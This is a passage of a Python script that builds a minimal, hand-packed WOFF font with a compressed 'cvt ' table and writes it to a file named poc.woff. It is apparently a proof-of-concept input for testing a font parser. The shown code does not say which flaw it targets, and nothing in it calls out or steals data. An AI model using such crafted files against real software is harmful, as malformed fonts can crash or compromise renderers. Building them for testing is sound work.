            + u16(2) + u16(2) + u16(0) + u16(0)  # segCountX2, searchRange, entrySelector, rangeShift
            + u16(0xFFFF)                        # endCode[0]
            + u16(0)                             # reservedPad
            + u16(0xFFFF)                        # startCode[0]
            + u16(1)                             # idDelta[0] -> glyph 0
            + u16(0))                            # idRangeOffset[0]
cmap = u16(0) + u16(1) + u16(3) + u16(1) + u32(12) + cmap_sub

glyf = b'\x00' * 4

head = (u32(0x00010000) + u32(0x00010000) + u32(0) + u32(0x5F0F3CF5)
        + u16(0)          # flags
        + u16(16)         # unitsPerEm (ppem, must be 16..16384)
        + b'\x00' * 8 + b'\x00' * 8  # created, modified
        + struct.pack('>hhhh', 0, 0, 1000, 1000)  # bbox
        + u16(0)          # macStyle
        + u16(16)         # lowestRecPPEM
        + struct.pack('>h', 2)   # fontDirectionHint
        + struct.pack('>h', 0)   # indexToLocFormat = short
        + struct.pack('>h', 0))  # glyphDataFormat
assert len(head) == 54

hhea = (u32(0x00010000) + struct.pack('>hhh', 800, -200, 0)  # version, ascent, descent, linegap
        + u16(1000) + struct.pack('>hhh', 0, 0, 1000)        # advWidthMax, min_sb1, min_sb2, max_extent
        + struct.pack('>hh', 0, 0) + struct.pack('>h', 0)    # caret rise/run/offset
        + b'\x00' * 8                                        # reserved
        + struct.pack('>h', 0)                               # metric data format
        + u16(1))                                            # numberOfHMetrics
assert len(hhea) == 36

hmtx = u16(1000) + struct.pack('>h', 0)  # 1 metric

loca = u16(0) + u16(0)  # glyph 0 empty, end offset 0

maxp = (u32(0x00010000) + u16(NUM_GLYPHS)
        + u16(0) + u16(0) + u16(0) + u16(0)   # maxPoints, maxContours, maxCompositePoints, maxCompositeContours
        + u16(1) + u16(0) + u16(0) + u16(0) + u16(0) + u16(64) + u16(0)  # maxZones, maxTwicePoints, maxStorage, maxFunctionDefs, maxInstructionDefs, maxStackElements, maxSizeOfInstructions
        + u16(0) + u16(0))                    # maxComponentElements, maxComponentDepth
assert len(maxp) == 32

name = u16(0) + u16(0) + u16(6)

post = u32(0x00030000) + u32(0) + struct.pack('>hh', -100, 50) + u32(0) + u32(0)*1 + u32(0)*1
post = u32(0x00030000) + u32(0) + struct.pack('>hh', -100, 50) + u32(0) + b'\x00' * 16
assert len(post) == 32

cvt_plain = b'\x00' * 64
cvt_comp = zlib.compress(cvt_plain, 9)
assert len(cvt_comp) < len(cvt_plain)

tables = {
    'OS/2': os2,
    'cmap': cmap,
    'cvt ': cvt_comp,
    'glyf': glyf,
    'head': head,
    'hhea': hhea,
    'hmtx': hmtx,
    'loca': loca,
    'maxp': maxp,
    'name': name,
    'post': post,
}
raw = {'cvt ': cvt_plain}

num = len(tables)
hdr_end = 44 + 20 * num

# layout in tag order
order = sorted(tables)
offsets = {}
off = hdr_end
for t in order:
    offsets[t] = off
    off += len(tables[t])
    off = (off + 3) & ~3

file_len = off

total_sfnt = 12 + 16 * num
for t in order:
    ulen = len(raw.get(t, tables[t]))
    total_sfnt += (ulen + 3) & ~3

records = b''
for t in order:
    data = tables[t]
    ulen = len(raw.get(t, data))
    records += t.encode('latin1') + u32(offsets[t]) + u32(len(data)) + u32(ulen) + u32(0)

hdr = (b'wOFF' + u32(0x00010000) + u32(file_len) + u16(num) + u16(0)
       + u32(total_sfnt) + u16(1) + u16(0)
       + u32(0) + u32(0) + u32(0)   # meta offset/len/orig
       + u32(0) + u32(0))           # priv offset/len
assert len(hdr) == 44

blob = bytearray(hdr + records)
assert len(blob) == hdr_end
for t in order:
    blob.extend(b'\x00' * (offsets[t] - len(blob)))
    blob.extend(tables[t])
blob.extend(b'\x00' * (file_len - len(blob)))

open('/workspace/poc.woff', 'wb').write(bytes(blob))
print('file_len=%d total_sfnt=%d cvt_comp=%d' % (file_len, total_sfnt, len(cvt_comp)))
EOF
